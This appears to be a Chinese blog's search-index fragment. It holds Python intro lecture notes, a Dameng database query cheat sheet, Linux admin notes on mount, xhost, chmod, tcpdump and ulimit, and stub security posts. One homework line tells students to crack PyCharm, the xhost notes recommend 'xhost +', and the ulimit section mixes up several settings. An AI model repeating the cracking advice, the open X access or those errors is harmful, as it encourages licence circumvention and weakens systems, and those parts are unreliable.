（与蟒蛇无关） 2. 创始人：吉多-范罗苏姆 Guido Van Rossum 江湖：龟叔3. Monkey Python 蒙提-派森 电视剧 马戏团 4. 诞生： 1989年 圣诞节5. 发行： 1991年第一个发行版6. Python1.x -&gt; Python2.x -&gt; Python3.x 2018年宣告不再对Python2进行更新和维护（最后一个2版本 Python2.7） Python3纠正2中存在的一些缺陷和冗余，让Python变得更加的简单(最新Python3.9) 三、Python为何才流行起来1234567# 1. 为什么之前并不流行1. 90年代程序员更追求程序执行的速度和效率，而计算机的性能有限，Python相对于C语言、C++等执行速度要更慢 -- Python是一个解释型的语言2. Python的出生并不好，Java东家是Sun # 2. 为什么现在又流行起来了1. 现在的计算机的处理速度很快 C代码0.01 Python代码0.1 对人而言无感2. 人工智能带动 （Python做人工智能更合适 强大的类库） 四、Python的特点1Python的定位：简洁、优雅、明确 简单易学、明确优雅、开发速度快 Python输出HelloWorld 1print(&quot;HelloWorld&quot;) C语言输出HelloWorld 12345#include &lt;stdio.h&gt;int main(int args, const char* argv[])&#123; printf(&quot;HelloWorld&quot;); return 0;&#125; Java输出HelloWorld 12345public class HelloWorld&#123; public static void main(String args[])&#123; System.out.println(&quot;HelloWorld&quot;); &#125;&#125; Python口号：人生苦短，我用Python Python有大量的内置的功能模块、类库，提高开发效率 五、Python到底是什么Python是一种纯面向对象的解释型的程序设计语言，胶水语言 1231. 纯面向对象的语言 （一切皆对象/万物皆对象 a=5 a是对象）2. 解释型的3. 程序设计语言 自然语言：人类能够理解的语言 （中文、英文、日文） 编程语言-计算机语言： 机器语言（第一代）： 机器能够理解的语言 0和1 用纸带打孔编程 打孔是1 不打孔是0 电子器件 高低电平 汇编语言（第二代） 直接面向处理器进行编程 mov add sub 寄存器 高级语言（第三代）： C&#x2F;C++&#x2F;Java&#x2F;Python 人类能够直接理解的语言，更接近于人类的“自然语言”，同时机器也能理解（桥梁） 越接近人类的语言越高级，越接近机器的语言越低级（相对于人类而言） 任何的代码最终都需要被“翻译”成二进制的形式才能在计算机中运行。 编译型语言： 如：C&#x2F;C++&#x2F;GO语言等，这些语言在被计算机执行之前，都必须先翻译成二进制的目标代码，然后再由计算机来执行。这个过程叫做“编译（Compile）”，这样的编程语言叫“编译型语言”，完成翻译过程的工具叫“编译器（Compiler）” – 先编译后执行 解释型语言 如：Javascript、Python等语言，这些语言是一边翻译一边执行，不会生成可执行的目标文件。不需要等待所有的代码都翻译完之后再执行，这个过程叫“解释（interpret）”, 这样的编程语言叫“解释型的语言或脚本语言”，完成这个解释的工具叫“解释器（interpreter）” – 边翻译边执行 区别： 编译型语言，执行速度快、效率高（C、C++） ，依靠编译器，跨平台性差 解释型语言，执行速度慢、效率低（Javascript、Python），依靠解释器，跨平台性好 语言本身的快慢并会被我们体会出来，真正让我们体会到差距的是写程序的人 六、Python的环境搭建Python是跨平台，windows平台可以使用，Linux&#x2F;Unix平台，Mac os x平台 搭建Python环境，实际上就是安装Python的解释器 分版本：2.x 3.x 现在企业大部分使用的都是3.x &gt;3.5 &lt; 3.7 1、Windows平台如何安装Python3.6 先下载Python3.6的安装包 www.python.org 双击 Python3.6.6.exe直接安装即可 验证安装是否成功 打开cmd&#x2F;dos窗口 ，如果提示 “Python”不是内部或外部命令…是由于没有配置环境变量 如何手动配置环境变量： 右键点击“计算机”-&gt;“属性” -&gt;“高级系统设置” -&gt;环境变量 -&gt; 系统变量 环境变量的目的：允许我们在cmd的任意目录下可以直接使用python 七、代码编辑器有三种方式可以来编写运行Python代码： 1、交互式界面 可以在cmd窗口中，输入python，进入Python的交互式界面，直接输入代码 使用exit()退出交互式界面 2、命令行脚本 使用任意的软件编写一个xx.py文件，在.py文件中编写python代码，在cmd窗口输入 1python xx.py -- xx.py可以是相对路径或绝对路径 3、集成开发环境IDE 比如：Sublime Text、IDLE、Pycharm IDLE 是Python自带的集成开发环境 Sublime Text 相当一个文本编辑器 要更强大 Pycharm 功能太强大 但太重 适合大项目 多文件联合使用 八、Python解释器Python是一门解释型语言，所以Python代码的执行必须要由解释器来解释执行 解释器的版本： CPython 官方版本的解释器，由C语言开发，使用最广泛的一个解释器 IPython 基于CPython PyPy 优化后的一个解释器，速度会快一些 JPython Java编写的解释器，可以让Python在Java中执行 IronPython 运行.net平台 如何提高Python的运行速度： Python代码也可以先编译，再执行 把Python代码先编译成字节码文件（.pyc 机器不能直接运行），再由Python虚拟机（PVM）将字节码转成机器码运行 下次再运行同样代码的时候，可以直接找字节码文件 ，提高运行速度 如何生成字节码文件： 1234# 在cmd命令行中 python -m py_compile xx.py# 不会运行该文件，而是编译生成字节码 然后 python xxx.pyc 执行字节码文件 速度更快 作业： ​ 1、熟悉今天讲的一些概念 名词 ​ 2、总结笔记–自己的总结（纸质版） ​ 3、安装Python3.6 ​ 4、安装Pycharm2019 + 并破解 明天早上或今晚由组长检查，笔记明天上课前交上来","categories":[],"tags":[]},{"title":"达蒙数据库linux运维收藏","slug":"达蒙数据库linux运维收藏","date":"2024-10-24T11:18:42.000Z","updated":"2024-10-24T11:28:08.447Z","comments":true,"path":"2024/10/24/达蒙数据库linux运维收藏/","permalink":"http://example.com/2024/10/24/%E8%BE%BE%E8%92%99%E6%95%B0%E6%8D%AE%E5%BA%93linux%E8%BF%90%E7%BB%B4%E6%94%B6%E8%97%8F/","excerpt":"","text":"1.1 查询实例信息12345678SQL&gt; select name inst_name from v$instance;行号 INST_NAME---------- ---------1 DMSERVER已用时间: 11.211(毫秒). 执行号:15.1234567 1.2 查询数据库当前状态123456SQL&gt; select status$ from v$instance;行号 STATUS$---------- -------1 OPEN12345 1.3 查询DB_MAGIC1234567SQL&gt; select db_magic from v$rlog;行号 DB_MAGIC ---------- --------------------1 1040931148123456 1.4 查询是否归档123456SQL&gt; select arch_mode from v$database;行号 ARCH_MODE---------- ---------1 N12345 1.5 查询授权截止有效期123456SQL&gt; select EXPIRED_DATE from v$license;行号 EXPIRED_DATE ---------- ------------------1 2021-06-0112345 1.6 查看等待情况12345SQL&gt; select class_name,total_waits count from v$wait_class;未选定行已用时间: 116.087(毫秒). 执行号:27.1234 1.7 查看数据库配置端口1234567891011121314151617181920SQL&gt; select para_name,para_value from v$dm_ini where para_name like &#x27;%PORT%&#x27;;行号 PARA_NAME PARA_VALUE---------- -------------------- ----------1 PORT_NUM 52362 ELOG_REPORT_LINK_SQL 03 DFS_HUGE_SUPPORT 14 EXTERNAL_JFUN_PORT 63635 EXTERNAL_AP_PORT 42366 DCRS_PORT_NUM 62367 AP_PORT_NUM 08 DW_PORT 09 DCP_PORT_NUM 523710 HA_OTHER_INST_PORT 6553411 HA_INST_CHECK_PORT 6553411 rows got已用时间: 96.994(毫秒). 执行号:8.12345678910111213141516171819 1.8 查询数据库最大连接数12345678SQL&gt; select SF_GET_PARA_VALUE(2,&#x27;MAX_SESSIONS&#x27;);行号 SF_GET_PARA_VALUE(2,&#x27;MAX_SESSIONS&#x27;)---------- -----------------------------------1 100已用时间: 1.961(毫秒). 执行号:5.1234567 1.9 查询命令执行计划12345678SQL&gt; explain select * from test_table;1 #NSET2: [0, 1, 56] 2 #PRJT2: [0, 1, 56]; exp_num(2), is_atom(FALSE) 3 #CSCN2: [0, 1, 56]; INDEX33555607(TEST_TABLE)已用时间: 3.655(毫秒). 执行号:0.1234567 1.10 查询用户密码限制登录次数和密码过期天数123456789101112SQL&gt; select u.username,p.FAILED_NUM,p.life_time from SYSUSERS p,dba_users u where p.FAILED_NUM not in (&#x27;0&#x27;) order by 1,2 ;行号 USERNAME FAILED_NUM LIFE_TIME ---------- ---------- ----------- -----------1 SYS 3 02 SYSAUDITOR 3 03 SYSDBA 3 04 SYSSSO 3 05 TEST 3 0已用时间: 12.079(毫秒). 执行号:66.1234567891011 注释：life_time为0，表示不限制密码过期天数 1.11 查询数据库字符集123456789101112131415SQL&gt; select SF_GET_UNICODE_FLAG();行号 SF_GET_UNICODE_FLAG()---------- ---------------------1 0已用时间: 0.321(毫秒). 执行号:38.SQL&gt; select UNICODE ();行号 UNICODE() ---------- -----------1 0已用时间: 0.288(毫秒). 执行号:39.1234567891011121314 注释：0 表示 GB18030，1 表示 UTF-8，2 表示 EUC-KR 1.12 修改密码策略1234SQL&gt; SP_SET_PARA_VALUE(1,&#x27;PWD_POLICY&#x27;,3);DMSQL 过程已成功完成已用时间: 10.188(毫秒). 执行号:7.123 系统支持的口令策略有：0无策略1禁止与用户名相同2口令长度不小于94至少包含一个大写字母（A-Z）8至少包含一个数字（0-9）16至少包含一个标点符号（英文输入法状态下，除”和空格外的所有符号） 口令策略可单独应用，也可组合应用。比如我们即要求禁止用户名与密码相同，又要求口令至少包含一个大写字母，则设置口令策略为1+4&#x3D;5即可。 1.13 查看密码策略123456789101112SQL&gt; select * from v$dm_ini a where a.PARA_NAME = &#x27;PWD_POLICY&#x27;;行号 PARA_NAME PARA_VALUE MIN_VALUE MAX_VALUE MPP_CHK SESS_VALUE FILE_VALUE---------- ---------- ---------- --------- --------- ------- ---------- ---------- DESCRIPTION PARA_TYPE ----------------------- ---------1 PWD_POLICY 2 0 31 N 2 2 Flag of password policy SYS已用时间: 16.146(毫秒). 执行号:4.1234567891011 1.14 查看每个用户的密码策略123456789101112131415SQL&gt; select username,password_versions,account_status from dba_users;行号 USERNAME PASSWORD_VERSIONS ACCOUNT_STATUS---------- ---------- ----------------- --------------1 SYSDBA 0 OPEN2 SYS 0 OPEN3 TEST12345 3 OPEN4 TEST 2 OPEN5 SYSSSO 0 OPEN6 SYSAUDITOR 0 OPEN6 rows got已用时间: 185.814(毫秒). 执行号:11.1234567891011121314 2.数据库文件&#x2F;空间信息2.1 查询归档信息123456789101112131415SQL&gt; select * from v$dm_arch_ini;行号 ARCH_NAME ARCH_TYPE ARCH_DEST ARCH_FILE_SIZE---------- -------------- --------- --------------------------------------- -------------- ARCH_SPACE_LIMIT ARCH_HANG_FLAG ARCH_TIMER_NAME ARCH_IS_VALID ARCH_WAIT_APPLY ---------------- -------------- --------------- ------------- --------------- ARCH_INCOMING_PATH ARCH_CURR_DEST ------------------ ---------------------------------------1 ARCHIVE_LOCAL1 LOCAL /home/dmdba/opt/dmdbms/data/DAMENG/arch 128 5000 1 NULL Y NULL NULL /home/dmdba/opt/dmdbms/data/DAMENG/arch已用时间: 0.565(毫秒). 执行号:12.1234567891011121314 2.2 查看控制文件12345678SQL&gt; select para_value name from v$dm_ini where para_name=&#x27;CTL_PATH&#x27;;行号 NAME ---------- --------------------------1 /dmdbms/data/DAMENG/dm.ctl已用时间: 31.907(毫秒). 执行号:11.1234567 2.3 查询日志文件1234567SQL&gt; select GROUP_ID ,FILE_ID,PATH,CLIENT_PATH from v$rlogfile;行号 GROUP_ID FILE_ID PATH CLIENT_PATH ---------- ----------- ----------- ----------------------------------------------- ------------1 2 0 /home/dmdba/opt/dmdbms/data/DAMENG/DAMENG01.log DAMENG01.log2 2 1 /home/dmdba/opt/dmdbms/data/DAMENG/DAMENG02.log DAMENG02.log123456 2.4 查询数据库占用空间注释：默认为M为单位 123456SQL&gt; select sum(bytes/1024/1024)|| &#x27;M&#x27; from dba_data_files;行号 SUM(BYTES/1024/1024)||&#x27;M&#x27;---------- -------------------------1 289M12345 2.5 查询数据文件位置123456789SQL&gt; select GROUP_ID , ID ,path,STATUS$ from v$datafile;行号 GROUP_ID ID PATH STATUS$ ---------- ----------- ----------- --------------------------------------------- -----------1 0 0 /home/dmdba/opt/dmdbms/data/DAMENG/SYSTEM.DBF 12 1 0 /home/dmdba/opt/dmdbms/data/DAMENG/ROLL.DBF 13 3 0 /home/dmdba/opt/dmdbms/data/DAMENG/TEMP.DBF 14 4 0 /home/dmdba/opt/dmdbms/data/DAMENG/MAIN.DBF 112345678 2.6 查询表空间大小12345678910SQL&gt; select FILE_NAME,FILE_ID,TABLESPACE_NAME,BYTES/1024/1024||&#x27;M&#x27; from dba_data_files;行号 FILE_NAME FILE_ID TABLESPACE_NAME BYTES/1024/1024||&#x27;M&#x27;---------- --------------------------------------------- ----------- --------------- --------------------1 /home/dmdba/opt/dmdbms/data/DAMENG/SYSTEM.DBF 0 SYSTEM 23M2 /home/dmdba/opt/dmdbms/data/DAMENG/TEST.DBF 0 TEST 50M3 /home/dmdba/opt/dmdbms/data/DAMENG/MAIN.DBF 0 MAIN 128M4 /home/dmdba/opt/dmdbms/data/DAMENG/TEMP.DBF 0 TEMP 10M5 /home/dmdba/opt/dmdbms/data/DAMENG/ROLL.DBF 0 ROLL 128M123456789 2.7 查看表空间使用情况12345678910111213SQL&gt; select t1.NAME tablespace_name, t2.FREE_SIZE*SF_GET_PAGE_SIZE()/1024/1024 ||&#x27;M&#x27; free_space, t2.TOTAL_SIZE*SF_GET_PAGE_SIZE()/1024/1024 ||&#x27;M&#x27; total_space, t2.FREE_SIZE*100/t2.total_size &quot;% FREE&quot; from V$TABLESPACE t1, V$DATAFILE t2 where t1.ID=t2.GROUP_ID;行号 TABLESPACE_NAME FREE_SPACE TOTAL_SPACE % FREE ---------- --------------- ---------- ----------- --------------------1 SYSTEM 17M 24M 742 MAIN 120M 128M 943 TEMP 9M 10M 994 ROLL 119M 128M 93123456789101112 2.8 查询当前用户模式12345678SQL&gt; SELECT SYS_CONTEXT (&#x27;userenv&#x27;, &#x27;current_schema&#x27;) FROM DUAL;行号 SYS_CONTEXT(&#x27;userenv&#x27;,&#x27;current_schema&#x27;)---------- ---------------------------------------1 SYSDBA已用时间: 79.134(毫秒). 执行号:6.1234567 3.数据库用户&#x2F;角色信息3.1 查询数据库有哪些用户1234567891011SQL&gt; select username from dba_users;行号 USERNAME ---------- ----------1 SYSDBA2 SYS3 SYSSSO4 SYSAUDITOR已用时间: 9.740(毫秒). 执行号:6.12345678910 3.2 查询数据库用户信息123456789SQL&gt; select username,user_id,default_tablespace,profile from dba_users;行号 USERNAME USER_ID DEFAULT_TABLESPACE PROFILE ---------- ---------- ----------- ------------------ ---------------------------------------------1 SYSDBA 50331649 MAIN /home/dmdba/opt/dmdbms/data/DAMENG/MAIN.DBF2 SYS 50331648 SYSTEM /home/dmdba/opt/dmdbms/data/DAMENG/SYSTEM.DBF3 SYSSSO 50331651 SYSTEM /home/dmdba/opt/dmdbms/data/DAMENG/SYSTEM.DBF4 SYSAUDITOR 50331650 SYSTEM /home/dmdba/opt/dmdbms/data/DAMENG/SYSTEM.DBF12345678 3.3 查看数据库对象12345678910111213141516SQL&gt; select t2.name owner,t1.subtype$ object_type,t1.valid status,count(1) count# from sysobjects t1,sysobjects t2 where t1.schid=t2.id and t1.schid!=0 group by t2.name,t1.subtype$,t1.valid;行号 OWNER OBJECT_TYPE STATUS COUNT# ---------- ---------- ----------- ------ --------------------1 SYS INDEX Y 2872 DEM INDEX Y 1493 CTISYS STAB Y 14 CTISYS CONS Y 15 CTISYS INDEX Y 16 SYSSSO STAB Y 87 SYSSSO CONS Y 98 SYSSSO INDEX Y 99 SYSAUDITOR STAB Y 410 SYSAUDITOR CONS Y 211 SYSAUDITOR INDEX Y 5123456789101112131415 3.4 查询用户对象1234567891011121314151617181920212223select * from user_objects;行号 OBJECT_NAME SUBOBJECT_NAME OBJECT_ID DATA_OBJECT_ID OBJECT_TYPE---------- ---------------- -------------- --------- -------------- ----------- CREATED ---------------------------------------------------------------------------------------------------- LAST_DDL_TIME ---------------------------------------------------------------------------------------------------- TIMESTAMP ---------------------------------------------------------------------------------------------------- STATUS TEMPORARY GENERATED SECONDARY NAMESPACE EDITION_NAME ------ --------- --------- --------- --------- ------------312 ADMIN_AUDIT_SQL NULL 1287 NULL TABLE 2020-08-20 18:07:18.521000 2020-08-20 18:07:18.000000 2020-08-20 18:07:18.521000 VALID N N NULL NULL NULL312 rows got已用时间: 793.928(毫秒). 执行号:55.12345678910111213141516171819202122 3.5 查看角色类型12345678910111213141516SQL&gt; select * from dba_roles;行号 ROLE PASSWORD_REQUIRED AUTHENTICATION_TYPE---------- ---------------- ----------------- -------------------1 DBA NULL NULL2 DB_AUDIT_ADMIN NULL NULL3 DB_AUDIT_OPER NULL NULL4 DB_AUDIT_PUBLIC NULL NULL5 DB_AUDIT_SOI NULL NULL6 DB_AUDIT_VTI NULL NULL7 DB_POLICY_ADMIN NULL NULL7 rows got已用时间: 5.827(毫秒). 执行号:9.123456789101112131415 3.6 查看用户的角色和权限123456789101112131415161718192021222324252627282930SQL&gt; select * from SYS.DBA_ROLE_PRIVS ;行号 GRANTEE GRANTED_ROLE ADMIN_OPTION DEFAULT_ROLE---------- --------------- ---------------- ------------ ------------1 SYSDBA DBA Y NULL2 DBA VTI Y NULL3 SYSDBA SYS_ADMIN N NULL4 SYSDBA SOI Y NULL5 TEST SOI N NULL6 SYSDBA RESOURCE Y NULL7 SYSDBA PUBLIC Y NULL8 TEST PUBLIC N NULL9 DB_POLICY_ADMIN DB_POLICY_VTI Y NULL10 SYSSSO DB_POLICY_SOI Y NULL11 SYSSSO DB_POLICY_PUBLIC Y NULL行号 GRANTEE GRANTED_ROLE ADMIN_OPTION DEFAULT_ROLE---------- -------------- --------------- ------------ ------------12 SYSSSO DB_POLICY_OPER Y NULL13 SYSSSO DB_POLICY_ADMIN Y NULL14 DB_AUDIT_ADMIN DB_AUDIT_VTI Y NULL15 SYSAUDITOR DB_AUDIT_SOI Y NULL16 SYSAUDITOR DB_AUDIT_PUBLIC Y NULL17 SYSAUDITOR DB_AUDIT_OPER Y NULL18 SYSAUDITOR DB_AUDIT_ADMIN Y NULL18 rows got已用时间: 4.989(毫秒). 执行号:48.1234567891011121314151617181920212223242526272829 3.7 表空间脱机&#x2F;在线1234567SQL&gt; alter tablespace &quot;TEST&quot; offline; 操作已执行已用时间: 280.323(毫秒). 执行号:4.SQL&gt; alter tablespace &quot;TEST&quot; online; 操作已执行已用时间: 121.133(毫秒). 执行号:5.123456 4.数据库运维信息4.1 创建表空间注释：默认大小为M 1234SQL&gt; create tablespace TEST datafile &#x27;/home/dmdba/opt/dmdbms/data/DAMENG/TEST.DBF&#x27; size 50;操作已执行已用时间: 15.041(毫秒). 执行号:28.123 4.2 查询总表数量123456SQL&gt; select count(*) from dba_tables;行号 COUNT(*) ---------- --------------------1 36312345 4.3 关闭数据库1234SQL&gt; shutdown normal; 关闭数据库SQL&gt; shutdown immediate; 正常方式关闭数据库SQL&gt; shutdown abort; 立即方式关闭数据库。数据库并不立即关闭，而是在执行某些清除工作后才关闭（终止会话、释放会话资源），需要10到20S。123 4.4 创建用户1234SQL&gt; create user test1 identified by 123456789 default tablespace test;操作已执行已用时间: 13.383(毫秒). 执行号:36.123 5.数据库表&#x2F;列&#x2F;视图信息5.1 查询当前用户所有表1234567891011121314SQL&gt; select table_name,tablespace_name from user_tables;行号 TABLE_NAME TABLESPACE_NAME---------- ------------------------------------ ---------------1 ##PLAN_TABLE TEMP2 ##HISTOGRAMS_TABLE TEMP3 ADMIN_ROLE MAIN4 ADMIN_SYS_CONFIG MAIN5 ADMIN_USER MAIN6 ADMIN_AUDIT MAIN7 ADMIN_AUDIT_SQL MAIN8 DBTOOL_DTS_TRANSFORM MAIN9 DBTOOL_DTS_TRANSFORM_EXECUTE MAIN12345678910111213 5.2 查询表的大小注释：页数，默认8KB大小 123456SQL&gt; SELECT TABLE_USED_SPACE (&#x27;SYS&#x27;,&#x27;SYSOBJECTS&#x27;) ;行号 TABLE_USED_SPACE(&#x27;SYS&#x27;,&#x27;SYSOBJECTS&#x27;)---------- ------------------------------------1 16012345 5.3 创建新表1234SQL&gt; create table tests ( id char not null) ;操作已执行已用时间: 97.526(毫秒). 执行号:16.123 5.4 增加表的列1234SQL&gt; alter table test_rename add ids int;操作已执行已用时间: 76.447(毫秒). 执行号:8.123 5.5 删除表的列1234SQL&gt; alter table test_table drop ids;操作已执行已用时间: 107.795(毫秒). 执行号:10.123 5.6 重命名表名1234SQL&gt; alter table tests rename to test_rename;操作已执行已用时间: 128.985(毫秒). 执行号:26.123 5.7 增加表注释1234SQL&gt; comment on table test_rename is &#x27;AAAAAAA&#x27;;操作已执行已用时间: 52.596(毫秒). 执行号:37.123 5.8 查询表注释12345678SQL&gt; select comments from user_tab_comments where table_name = &#x27;TEST_RENAME&#x27;;行号 COMMENTS---------- --------1 AAAAAAA已用时间: 2.094(毫秒). 执行号:39.1234567 5.8 增加列注释1234SQL&gt; comment on column test_rename.id is &#x27;Primary&#x27;; 操作已执行已用时间: 5.780(毫秒). 执行号:40.123 5.9 查询列注释12345678SQL&gt; select * from user_col_comments where owner = &#x27;SYSDBA&#x27; and table_name = &#x27;TEST_RENAME&#x27; and column_name = &#x27;ID&#x27;;行号 OWNER TABLE_NAME COLUMN_NAME COMMENTS---------- ------ ----------- ----------- --------1 SYSDBA TEST_RENAME ID Primary已用时间: 66.837(毫秒). 执行号:48.1234567 5.10 创建视图123SQL&gt; create view v_test as select C1,C2 from T1 where C3=&#x27;r&#x27;;操作已执行已用时间: 123.383(毫秒). 执行号:12.","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"Linux运维","slug":"Linux运维","date":"2024-10-24T10:51:58.000Z","updated":"2024-10-26T09:15:51.187Z","comments":true,"path":"2024/10/24/Linux运维/","permalink":"http://example.com/2024/10/24/Linux%E8%BF%90%E7%BB%B4/","excerpt":"","text":"Linux检查系统内存和存储空间 1234567# 获取内存总大小grep MemTotal /proc/meminfo# 获取交换分区大小grep SwapTotal /proc/meminfo#获取内存使用情况free 检查存储空间12# 检查目录可用空间df -h /mount_point/dir_name mount 挂载mount命令的一些常用选项： 选项 描述 -a 挂载&#x2F;etc&#x2F;fstab中列出的所有文件系统 -t [type] 指定文件系统类型 -o options 指定挂载选项 -r 以只读模式挂载文件系统 -w 以读写模式挂载文件系统 -v 详细模式，描述每个操作 Linux mount命令的实例以下是一些mount命令的常见用法示例： 12挂载一个设备：sudo mount /dev/sdb1 /mnt 12只读模式挂载sudo mount -o ro /dev/sdb1 /mnt 12挂载一个iso文件sudo mount -o loop /tmp/image.iso /mnt/cdrom 12# 将/dev/sdb1挂载到/mnt/usb目录上 sudo mount /dev/sdb1 /mnt/usb 12# 卸载/mnt/usb目录sudo umount /mnt/usb xhost 是用来控制X server访问权限的。 通常当你从hostA登陆到hostB上运行hostB上的应用程序时，做为应用程序来说，hostA是client，但是对图形来说，是在hostA上显示的，需要使用hostA的Xserver，所以hostA是server。因此在登陆到hostB前，需要在hostA上运行xhost +来使其它用户能够访问hostA的Xserver。 12345678xhost + 是使所有用户都能访问Xserver.xhost + ip使ip上的用户能够访问Xserver.xhost + nis:user@domain使domain上的nis用户user能够访问xhost + inet:user@domain使domain上的inet用户能够访问 chmod 改变文件权限 [root@server1 ~]# ls -l 12-rw-r--r-- 1 Mr_lee staff 29 12 14 16:15 1.txtdrwxr-xr-x 4 Mr_lee staff 136 10 11 18:44 Applications 第1列：表示是否是目录或文件 -代表文件 d代表目录第2-4列：表示用户权限 user第5-7列：表示所在的组权限 group第8-10列：表示其他人权限 other r : read 可读w : write 可写x : execution 可执行u : userg : groupo : othera : all 等价于ugo &#x3D;： 表示赋予（设置）指定权限，要注意它会覆盖原权限 +： add permission 添加权限 -： take away permission 移除权限 示例： chmod a+rwx 1.h 给所有人(ugo)添加可读可写可执行权限 chmod go-wx 1.h 给所在的组和其他人移除写和执行权限 数字表示法： chmod 755 1.h 等价于 用户:rwx 所在组:r-x 其他人:r-x即r &#x3D; 2^2 , w &#x3D; 2^1 , x &#x3D; 2^0 ,而 “-“ &#x3D; 0 Linux捕获网络流量1. 使用 tcpdumptcpdump 是一个强大的命令行工具，可以捕获和分析通过网络接口的流量。 安装 tcpdump（如果尚未安装）： 12sudo apt-get install tcpdump # Ubuntu/Debiansudo yum install tcpdump # CentOS/RHEL 捕获流量： 1sudo tcpdump -i eth0 这里 -i 指定要监听的网络接口，eth0 是一个示例，你需要根据实际情况替换。 保存捕获数据： 1sudo tcpdump -i eth0 -w capture.pcap 分析捕获数据： 1sudo tcpdump -r capture.pcap 2. 使用 Wireshark 选择网络接口并开始捕获：选择要监视的接口，然后点击“开始捕获”。 使用过滤器：可以使用过滤器来专注于特定类型的流量，例如： http：只显示 HTTP 流量 ip.addr == 192.168.1.1：只显示与特定 IP 地址相关的流量 4. 使用 nloadnload 是一个简单的命令行工具，用于监控网络流量的实时图形。 安装 nload： 12sudo apt-get install nload # Ubuntu/Debiansudo yum install nload # CentOS/RHEL 运行 nload： 1nload eth0 5. 使用 netstat 和 ss 查看网络连接： 1netstat -tuln 或者使用 ss： 1ss -tuln 查看流量统计： 1netstat -i 6. 使用 iptrafiptraf 是一个基于文本的网络流量监控工具，提供实时的流量统计。 安装 iptraf： 12sudo apt-get install iptraf # Ubuntu/Debiansudo yum install iptraf # CentOS/RHEL 运行 iptraf： 1sudo iptraf","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"}]},{"title":"ulimit命令","slug":"ulimit命令","date":"2024-10-24T10:44:03.000Z","updated":"2024-10-24T10:48:30.508Z","comments":true,"path":"2024/10/24/ulimit命令/","permalink":"http://example.com/2024/10/24/ulimit%E5%91%BD%E4%BB%A4/","excerpt":"","text":"ulimit命令的作用是什么？提高系统的性能和稳定性。通过合理地设置资源限制，可以防止因过度使用系统资源而导致系统崩溃或性能下降。例如，通过设置最大文件大小的限制，可以避免同时打开过多的文件导致系统崩溃；通过设置最大虚拟内存的限制，可以避免进程占用过多的内存导致系统变慢。 -a：显示所有资源限制。 -c：设置core文件的大小限制。 -d：设置数据段大小限制。 -f：设置文件大小限制。 -m：设置内存大小限制。 -n：设置打开文件数限制。 -p：设置缓冲区大小限制。 -s：设置栈大小限制。 -t：设置CPU时间限制。 查看当前系统的资源限制ulimit -a命令用于显示当前系统的所有资源限制，包括最大文件大小、最大进程数、最大打开文件数等等。下面是各个参数的含义： core file size (blocks, -c)：核心文件的大小限制，即当程序崩溃时生成的核心转储文件的最大大小。 data seg size (kbytes, -d)：数据段的大小限制，即每个进程可以使用的内存大小。 scheduling priority (-e)：调度优先级，即进程在CPU时间片分配时的优先级。 file size (blocks, -f)：文件的大小限制，即单个文件的最大大小。 pending signals (-i)：挂起的信号数量，即当前等待处理的信号的数量。 max locked memory (kbytes, -l)：最大锁定内存量，即一个进程最多可以占用的内存大小。 max memory size (kbytes, -m)：最大内存大小，即系统允许一个进程使用的最大内存量。 open files (-n)：打开的文件数限制，即一个进程最多可以同时打开多少个文件。 pipe size (512 bytes, -p)：管道大小限制，即一个进程可以通过管道发送或接收的数据的最大大小。 POSIX message queues (bytes, -q)：POSIX消息队列的大小限制，即一个进程可以拥有的最大消息队列的大小。 real-time priority (-r)：实时优先级，即进程在紧急情况下可以获得CPU时间片的优先级。 stack size (kbytes, -s)：栈大小限制，即一个进程可以使用的栈空间大小。 cpu time (seconds, -t)：CPU时间限制，即一个进程最多可以使用CPU的时间长度。 max user processes (-u)：最大用户进程数限制，即一个用户可以创建的最大进程数。 virtual memory (kbytes, -v)：虚拟内存大小限制，即系统允许一个进程使用的虚拟内存总量。 file locks (-x)：文件锁的数量限制，即一个进程最多可以拥有的文件锁的数量。 修改文件大小限制文件大小限制默认是4GB，但是可以通过修改系统参数的方式来提高这个限制。以下是修改方法： 1.使用ulimit命令查看当前的最大打开文件数限制：ulimit -n 2.使用vi编辑器打开&#x2F;etc&#x2F;security&#x2F;limits.conf文件：sudo vi /etc/security/limits.conf 3.在文件中添加以下行：* soft nofile 65535和* hard nofile 65535，其中65535是你想要设置的最大文件打开数限制。 4.保存并退出文件。 也可用以下命令设置最大打开文件描述符的数量 1ulimit -n &lt;number&gt; 修改进程数限制Linux系统中的进程数限制默认是1024，可以通过修改系统参数的方式来提高这个限制。以下是修改方法： 1.使用ulimit命令查看当前的最大进程数限制：ulimit -u 2.使用vi编辑器打开&#x2F;etc&#x2F;security&#x2F;limits.conf文件：sudo vi /etc/security/limits.conf 3.在文件中添加以下行：* soft nproc 65535和* hard nproc 65535，其中65535是你想要设置的最大进程数限制。 4.保存并退出文件。 5.重新登录以使更改生效。 要通过ulimit命令启动多个进程，可以使用以下命令： 1ulimit -u &lt;number_of_processes&gt; 其中，是你想要启动的进程数，例如100。请注意，这个设置只会影响当前会话，而不会影响整个系统。 1.查看最大打开文件描述符的数量：ulimit -n 2.查看最大用户进程数：ulimit -u 3.查看最大虚拟内存的大小：sysctl vm.overcommit_memory 4.查看最大信号数量：cat /proc/sys/kernel/pid_max 常见的误区和注意事项：1.不要随意提高最大文件大小限制或最大虚拟内存的大小，否则可能会导致系统崩溃或磁盘空间不足的问题。 2.不要同时设置多个资源限制，例如同时设置最大文件大小限制和最大用户进程数，可能会导致冲突和错误。 3.ulimit命令只能在当前会话中生效，如果要永久修改某个资源的默认限制，需要修改系统配置文件。 4.在使用ulimit命令时，应该仔细阅读相关文档和手册，了解每个参数的含义和使用方法，以避免出现错误或不必要的麻烦。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"JS渗透测试","slug":"JS渗透测试","date":"2024-10-03T05:06:11.000Z","updated":"2024-10-03T05:06:39.687Z","comments":true,"path":"2024/10/03/JS渗透测试/","permalink":"http://example.com/2024/10/03/JS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"","categories":[],"tags":[{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"java_web安全","slug":"java-web安全","date":"2024-10-03T04:20:14.000Z","updated":"2024-10-03T05:02:40.312Z","comments":true,"path":"2024/10/03/java-web安全/","permalink":"http://example.com/2024/10/03/java-web%E5%AE%89%E5%85%A8/","excerpt":"","text":"1、JavaWeb常见安全及代码逻辑通过URL信息来对应源码文件。没有代码的情况下很难渗透。2、目录遍历&